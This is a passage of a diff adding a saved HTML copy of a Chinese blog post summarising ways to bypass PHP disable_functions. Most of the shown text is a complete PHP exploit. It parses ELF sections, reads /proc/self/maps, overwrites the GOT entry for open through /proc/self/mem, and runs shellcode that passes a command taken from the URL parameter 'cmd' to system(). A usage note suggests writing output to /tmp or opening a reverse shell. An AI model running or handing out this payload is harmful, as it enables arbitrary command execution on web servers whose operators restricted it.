+        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">unp</span>(<span class="hljs-variable">$data</span>);
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_section</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">""</span></span>)</span>{
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>){
+
+            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);
+
+        }
+
+        <span class="hljs-variable language_">$this</span>-&gt;elf_shoff=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x28</span>,<span class="hljs-number">8</span>);
+
+        <span class="hljs-variable language_">$this</span>-&gt;elf_shentsize=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-number">2</span>);
+
+        <span class="hljs-variable language_">$this</span>-&gt;elf_shnum=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3c</span>,<span class="hljs-number">2</span>);
+
+        <span class="hljs-variable language_">$this</span>-&gt;elf_shstrndx=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0x3e</span>,<span class="hljs-number">2</span>);
+
+        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable language_">$this</span>-&gt;elf_shnum;<span class="hljs-variable">$i</span>+=<span class="hljs-number">1</span>){
+
+            <span class="hljs-variable">$sh_type</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">4</span>,<span class="hljs-number">4</span>);
+
+            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$sh_type</span>){
+
+                <span class="hljs-keyword">case</span> SHT_STRTAB:
+
+                    <span class="hljs-variable language_">$this</span>-&gt;strtab_section[<span class="hljs-variable">$i</span>]=
+
+                        <span class="hljs-keyword">array</span>(
+
+                            <span class="hljs-string">'strtab_offset'</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),
+
+                            <span class="hljs-string">'strtab_size'</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>)
+
+                        );
+
+                    <span class="hljs-keyword">break</span>;
+
+
+
+                <span class="hljs-keyword">case</span> SHT_RELA:
+
+                    <span class="hljs-variable language_">$this</span>-&gt;rel_plt_section[<span class="hljs-variable">$i</span>]=
+
+                        <span class="hljs-keyword">array</span>(
+
+                            <span class="hljs-string">'rel_plt_offset'</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),
+
+                            <span class="hljs-string">'rel_plt_size'</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),
+
+                            <span class="hljs-string">'rel_plt_entsize'</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)
+
+                        );
+
+                    <span class="hljs-keyword">break</span>;
+
+                <span class="hljs-keyword">case</span> SHT_DNYSYM:
+
+                    <span class="hljs-variable language_">$this</span>-&gt;dynsym_section[<span class="hljs-variable">$i</span>]=
+
+                        <span class="hljs-keyword">array</span>(
+
+                            <span class="hljs-string">'dynsym_offset'</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">24</span>,<span class="hljs-number">8</span>),
+
+                            <span class="hljs-string">'dynsym_size'</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;strtab_size=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">32</span>,<span class="hljs-number">8</span>),
+
+                            <span class="hljs-string">'dynsym_entsize'</span>=&gt;<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_shoff+<span class="hljs-variable">$i</span>*<span class="hljs-variable language_">$this</span>-&gt;elf_shentsize+<span class="hljs-number">56</span>,<span class="hljs-number">8</span>)
+
+                        );
+
+                    <span class="hljs-keyword">break</span>;
+
+
+
+                <span class="hljs-keyword">case</span> SHT_NULL:
+
+                <span class="hljs-keyword">case</span> SHT_PROGBITS:
+
+                <span class="hljs-keyword">case</span> SHT_DYNAMIC:
+
+                <span class="hljs-keyword">case</span> SHT_SYMTAB:
+
+                <span class="hljs-keyword">case</span> SHT_NOBITS:
+
+                <span class="hljs-keyword">case</span> SHT_NOTE:
+
+                <span class="hljs-keyword">case</span> SHT_FINI_ARRAY:
+
+                <span class="hljs-keyword">case</span> SHT_INIT_ARRAY:
+
+                <span class="hljs-keyword">case</span> SHT_GNU_versym:
+
+                <span class="hljs-keyword">case</span> SHT_GNU_HASH:
+
+                     <span class="hljs-keyword">break</span>;
+
+
+
+                <span class="hljs-keyword">default</span>:
+
+ <span class="hljs-comment">//                   echo "who knows what $sh_type this is? ";</span>
+
+
+
+              } 
+
+          }
+
+     }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_reloc</span>(<span class="hljs-params"></span>)</span>{
+
+        <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();
+
+        <span class="hljs-variable">$dynsym_section</span>= <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable language_">$this</span>-&gt;dynsym_section);
+
+        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable language_">$this</span>-&gt;strtab_section);
+
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;rel_plt_section <span class="hljs-keyword">as</span> <span class="hljs-variable">$rel_plt</span> ){
+
+             <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">'rel_plt_offset'</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">'rel_plt_offset'</span>]+<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">'rel_plt_size'</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">'rel_plt_entsize'</span>])
+
+             {
+
+                <span class="hljs-variable">$rel_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">8</span>);
+
+                <span class="hljs-variable">$rel_info</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)&gt;&gt;<span class="hljs-number">32</span>;
+
+                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">'dynsym_offset'</span>]+<span class="hljs-variable">$rel_info</span>*<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">'dynsym_entsize'</span>],<span class="hljs-number">4</span>);
+
+                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">'strtab_offset'</span>]+<span class="hljs-variable">$fun_name_offset</span>-<span class="hljs-number">1</span>;
+
+                <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">''</span>;
+
+                <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">""</span>){
+
+                    <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));
+
+                }
+
+                <span class="hljs-variable">$rel_plts</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$rel_offset</span>;
+
+            }
+
+        }
+
+        <span class="hljs-variable language_">$this</span>-&gt;rel_plts=<span class="hljs-variable">$rel_plts</span>;
+
+    }
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_shared_library</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">""</span></span>)</span>{
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>){
+
+            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);
+
+        }
+
+        <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();
+
+        <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable language_">$this</span>-&gt;dynsym_section);
+
+        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable language_">$this</span>-&gt;strtab_section);
+
+        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">'dynsym_offset'</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">'dynsym_entsize'</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">'dynsym_offset'</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">'dynsym_size'</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">'dynsym_entsize'</span>])
+
+        {
+
+            <span class="hljs-variable">$shared_library_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>);
+
+            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">4</span>);
+
+            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$fun_name_offset</span>+<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">'strtab_offset'</span>]-<span class="hljs-number">1</span>;
+
+            <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">''</span>;
+
+            <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">""</span>){
+
+                <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));
+
+            }
+
+            <span class="hljs-variable">$shared_librarys</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$shared_library_offset</span>;
+
+         }
+
+         <span class="hljs-variable language_">$this</span>-&gt;shared_librarys=<span class="hljs-variable">$shared_librarys</span>;
+
+   }
+
+   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>{
+
+       <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable language_">$this</span>-&gt;elf_bin);
+
+   }
+
+
+
+   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)
+
+   </span>{
+
+       <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
+
+   }
+
+   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">packlli</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>{
+
+       <span class="hljs-variable">$higher</span> = (<span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0xffffffff00000000</span>) &gt;&gt; <span class="hljs-number">32</span>;
+
+       <span class="hljs-variable">$lower</span> = <span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0x00000000ffffffff</span>;
+
+       <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">'V2'</span>, <span class="hljs-variable">$lower</span>, <span class="hljs-variable">$higher</span>);
+
+   }
+
+}
+
+<span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">elf</span>();
+
+<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-string">'/proc/self/exe'</span>);
+
+<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();
+
+<span class="hljs-variable">$open_php</span>=<span class="hljs-variable">$test</span>-&gt;rel_plts[<span class="hljs-string">'open'</span>];
+
+<span class="hljs-variable">$maps</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'/proc/self/maps'</span>);
+
+<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/(\w+)-(\w+)\s+.+\[stack]/'</span>, <span class="hljs-variable">$maps</span>, <span class="hljs-variable">$stack</span>);
+
+<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/(\w+)-(\w+).*?libc-/'</span>,<span class="hljs-variable">$maps</span>,<span class="hljs-variable">$libcgain</span>);
+
+<span class="hljs-variable">$libc_base</span> = <span class="hljs-string">"0x"</span>.<span class="hljs-variable">$libcgain</span>[<span class="hljs-number">1</span>];
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"Libc base: "</span>.<span class="hljs-variable">$libc_base</span>.<span class="hljs-string">"\n"</span>;
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"Stack location: "</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>].<span class="hljs-string">"\n"</span>;
+
+<span class="hljs-variable">$array_tmp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">'-'</span>,<span class="hljs-variable">$maps</span>);
+
+<span class="hljs-variable">$pie_base</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">"0x"</span>.<span class="hljs-variable">$array_tmp</span>[<span class="hljs-number">0</span>]);
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"PIE base: "</span>.<span class="hljs-variable">$pie_base</span>.<span class="hljs-string">"\n"</span>;
+
+<span class="hljs-variable">$test2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">elf</span>();
+
+<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-string">'/usr/lib64/libc-2.17.so'</span>);
+
+<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();
+
+<span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_shared_library</span>();
+
+<span class="hljs-variable">$sys</span> = <span class="hljs-variable">$test2</span>-&gt;shared_librarys[<span class="hljs-string">'system'</span>];
+
+<span class="hljs-variable">$sys_addr</span> = <span class="hljs-variable">$sys</span> + <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$libc_base</span>);
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"system addr:"</span>.<span class="hljs-variable">$sys_addr</span>.<span class="hljs-string">"\n"</span>;
+
+<span class="hljs-variable">$mem</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'/proc/self/mem'</span>,<span class="hljs-string">'wb'</span>);
+
+<span class="hljs-variable">$shellcode_loc</span> = <span class="hljs-variable">$pie_base</span> + <span class="hljs-number">0x2333</span>;
+
+<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$open_php</span>);
+
+<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$shellcode_loc</span>));
+
+<span class="hljs-variable">$command</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>];<span class="hljs-comment">//我们要执行的命令</span>
+
+<span class="hljs-variable">$stack</span>=<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">"0x"</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>]);
+
+<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-variable">$stack</span>);
+
+<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-string">"<span class="hljs-subst">{$command}</span>\x00"</span>);
+
+<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$stack</span>;
+
+<span class="hljs-variable">$shellcode</span> = <span class="hljs-string">"H\xbf"</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$cmd</span>).<span class="hljs-string">"H\xb8"</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$sys_addr</span>).<span class="hljs-string">"P\xc3"</span>;
+
+<span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode_loc</span>);
+
+<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode</span>);
+
+<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">'zxhy'</span>);
+
+<span class="hljs-keyword">exit</span>();
+</code></pre>
+<p>usage:url?cmd=要执行的命令<br>
+注意命令无回显，建议命令结果写入文件(写入到可写文件的地方，如/tmp)，再去该目录读文件（默认已有shell）。反弹shell就更不用说了。</p>
+
+</div>
+<div class="clear"></div>
+<div id="blog_post_info_block" role="contentinfo">
+
+
+<div id="BlogPostCategory">
+    分类: 
+            <a href="https://www.cnblogs.com/sakura521/category/1978638.html" target="_blank">Web安全</a>
+,             <a href="https://www.cnblogs.com/sakura521/category/1978648.html" target="_blank">经验分享</a>
+</div>
+
+    <div id="blog_post_info">
+                <div class="esa-sponsor">
+                    <div class="title">本文所有内容仅可用于学习和交流，如用于非法活动一切责任与本站无关且后果自负</div>
+                    <ul class="box">
+                        <li class="paypal"><svg t="1599893643429" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1307" width="25" height="25"><path d="M941.021887 369.059735c7.422144 34.295426 5.703717 73.709573-2.303424 116.524012-37.147285 188.515157-162.263434 253.632592-322.771878 253.632592h-25.154854c-19.414575 0-35.428857 14.295855-38.82915 33.710429l-2.303424 10.859-31.407006 197.655729-1.133431 8.555575c-3.985289 19.414575-19.999572 33.71043-39.414146 33.71043H334.30728c-16.014282 0-26.288285-13.125861-23.984861-29.140144 10.274003-63.984004 19.999572-127.968008 30.273575-191.952012s20.548006-127.383011 30.858571-191.367015c1.718428-13.710858 10.859-21.133002 24.569857-21.133003 22.85143 0 45.70286-0.584997 74.843004 0 41.132574 0.584997 88.553862-1.718428 134.805156-11.99243 61.68058-13.710858 117.694005-38.82915 163.945299-82.265148 41.717571-38.82915 69.687721-86.835434 88.553862-140.545435a515.893884 515.893884 0 0 0 19.999571-75.976435c1.133431-6.837148 2.851858-5.703717 6.837148-2.851858 31.407005 23.436427 49.139715 54.843432 55.976863 92.539151z m-98.242867-161.093441c0 46.836291-10.859 91.40572-26.288286 134.805156-29.688578 86.250437-85.702003 147.96758-172.537437 179.959582-46.287857 16.562716-94.842575 23.436427-143.98229 23.98486-34.295426 0.584997-68.55429 0-102.813154 0-37.147285 0-60.547149 18.281144-67.420859 54.843432-8.007141 43.435998-39.414146 245.662013-48.554718 302.772307-0.584997 3.985289-2.303424 5.703717-6.837148 5.703717H105.829543a27.494841 27.494841 0 0 1-27.421716-31.407005L210.946121 38.280716A45.995358 45.995358 0 0 1 256.063984 0h341.638019c24.569858 0 81.131717 10.859 119.412433 25.703288 81.131717 31.407005 125.664584 95.391009 125.664584 182.226444z" fill="var(--text-color)" p-id="1308"></path></svg></li>
+                        <li class="alipay"><svg t="1599893614075" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1025" width="25" height="25"><path d="M828.571429 624.342857c-44.228571-14.742857-103.657143-37.371429-169.714286-61.257143 39.771429-68.914286 71.428571-147.428571 92.228571-232.685714H533.142857v-78.4h266.971429v-43.771429H533.142857V77.714286h-109.028571c-19.085714 0-19.085714 18.857143-19.085715 18.857143v111.771428H135.085714v43.771429h270.057143v78.4H182.171429v43.771428h432.457142a762.491429 762.491429 0 0 1-62.285714 151.885715c-140.342857-46.171429-290.057143-83.657143-384.114286-60.571429-60.114286 14.857143-98.857143 41.257143-121.714285 68.914286-104.457143 126.857143-29.6 319.542857 191.085714 319.542857C368 853.942857 493.714286 781.257143 591.085714 661.714286 736.342857 731.428571 1024 851.085714 1024 851.085714V680.457143s-36.114286-2.857143-195.428571-56.114286zM217.028571 780.114286c-172 0-222.857143-135.2-137.828571-209.257143 28.342857-25.028571 80.228571-37.257143 107.885714-40 102.171429-10.057143 196.8 28.8 308.457143 83.2-78.628571 102.285714-178.628571 166.057143-278.514286 166.057143z" fill="var(--text-color)" p-id="1026"></path></svg></li>
+                        <li class="wechat"><svg t="1599893658389" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1451" width="25" height="25"><path d="M1004.416 543.914667c-25.984-58.88-75.008-105.642667-131.925333-134.442667-100.437333-50.858667-225.322667-50.56-325.504 1.28-69.589333 35.712-127.701333 99.712-144.170667 177.578667-13.568 57.344-1.408 119.082667 29.013333 169.002666 45.269333 75.178667 127.104 123.178667 212.096 138.581334 61.568 12.501333 125.269333 5.077333 185.088-12.16 35.925333 13.909333 67.925333 36.437333 102.741334 53.162666a2238.762667 2238.762667 0 0 0-28.842667-89.685333c39.082667-27.733333 74.496-62.336 95.744-105.770667 31.744-60.373333 33.664-135.296 5.76-197.546666z m-423.424-403.882667c-106.453333-59.904-239.018667-68.906667-353.536-27.52-75.264 27.093333-143.36 77.44-185.429333 145.92-38.186667 61.866667-52.48 139.008-34.090667 209.792 18.474667 78.506667 73.002667 144.341333 139.178667 188.288-12.8 36.266667-24.96 72.490667-36.48 109.013333 41.6-21.76 83.2-44.501333 124.842666-66.602666 49.92 16 103.04 23.850667 156.16 22.101333a262.784 262.784 0 0 1-10.88-125.909333c9.6-58.496 41.6-112 85.077334-151.637334 73.642667-68.906667 177.962667-97.962667 277.162666-90.922666-18.602667-91.093333-82.602667-168.064-163.157333-212.48h1.152z m73.941333 426.197333c-8.917333 27.818667-49.322667 36.181333-68.906666 15.018667-21.589333-19.584-13.184-60.501333 15.146666-69.248 31.317333-13.226667 67.498667 22.912 53.76 54.229333z m204.586667 3.925334c-10.922667 25.002667-48.682667 30.848-67.242667 11.52-8.917333-8.149333-11.52-20.437333-14.677333-31.146667 4.437333-19.541333 17.92-39.808 39.68-40.746667 30.08-4.181333 57.002667 32.981333 41.6 60.416h0.64zM554.24 294.784c0.341333 41.002667-54.4 66.602667-85.12 38.784-31.872-22.826667-22.826667-78.378667 14.592-89.856 33.493333-13.44 73.088 14.677333 70.442667 50.56l0.085333 0.512z m-258.517333 10.410667c-7.338667 35.626667-55.082667 52.821333-83.029334 28.928-32.384-22.826667-23.296-79.402667 14.72-90.922667 37.248-14.336 79.573333 23.466667 68.309334 61.994667z" fill="var(--text-color)" p-id="1452"></path></svg><i class="fa fa-fwechat"></i></li>
+                    </ul>
+                    <div class="qrshow">
+                        <img src="https://www.cnblogs.com/sakura521/p/15055907.html">
+                    </div>
+                </div>
+<div id="green_channel">
+        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(15055907,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a>
+        <a id="green_channel_follow" onclick="follow(&#39;03047725-dc1f-421a-aedf-08d7709b037e&#39;);" href="javascript:void(0);">关注我</a>
+    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
+    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/icon_weibo_24.png" alt=""></a>
+    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/wechat.png" alt=""></a>
+</div>
+<div id="author_profile">
+    <div id="author_profile_info" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/sakura521/" target="_blank"><img src="./php disable_functions绕过总结 - Ctrl_C+Ctrl_V - 博客园_files/20210522142946.png" class="author_avatar" alt=""></a>
+        <div id="author_profile_detail" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/sakura521/">Ctrl_C+Ctrl_V</a>
+            <br>
+            <a href="https://home.cnblogs.com/u/sakura521/followers/">粉丝 - <span class="follower-count">17</span></a>
+            <a href="https://home.cnblogs.com/u/sakura521/followees/">关注 - <span class="following-count">2</span></a><br>
+        </div>
+    </div>
+    <div class="clear"></div>
+    <div id="author_profile_honor"></div>
+    <div id="author_profile_follow" class="follow-tip">
+                <a href="javascript:void(0);" onclick="follow(&#39;03047725-dc1f-421a-aedf-08d7709b037e&#39;);return false;">+加关注</a>
+    </div>
+</div>
+<div id="div_digg">
+    <div class="diggit" onclick="votePost(15055907,&#39;Digg&#39;)">
+        <span class="diggnum" id="digg_count">0</span>
+    </div>
+    <div class="buryit" onclick="votePost(15055907,&#39;Bury&#39;)">
+        <span class="burynum" id="bury_count">0</span>
+    </div>
+    <div class="clear"></div>
+    <div class="diggword" id="digg_tips">
+    </div>
+</div>
+
+<script type="text/javascript">
+    currentDiggType = 0;
+</script></div>
+    <div class="clear"></div>
+    <div id="post_next_prev">
+
+    <a href="https://www.cnblogs.com/sakura521/p/15054679.html" class="p_n_p_prefix">« </a> 上一篇：    <a href="https://www.cnblogs.com/sakura521/p/15054679.html" data-featured-image="" title="发布于 2021-07-24 10:59">带外通道</a>
+    <br>
+    <a href="https://www.cnblogs.com/sakura521/p/15091571.html" class="p_n_p_prefix">» </a> 下一篇：    <a href="https://www.cnblogs.com/sakura521/p/15091571.html" data-featured-image="" title="发布于 2021-08-02 20:33">docker安装nignx并配置https</a>
+
+</div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="698.9945537292708" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2021-07-24 23:36" aria-expanded="false">2021-07-24 23:36</span>&nbsp;
+<a href="https://www.cnblogs.com/sakura521/">Ctrl_C+Ctrl_V</a>&nbsp;
+阅读(<span id="post_view_count">325</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=15055907" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(15055907);return false;">收藏</a>&nbsp;
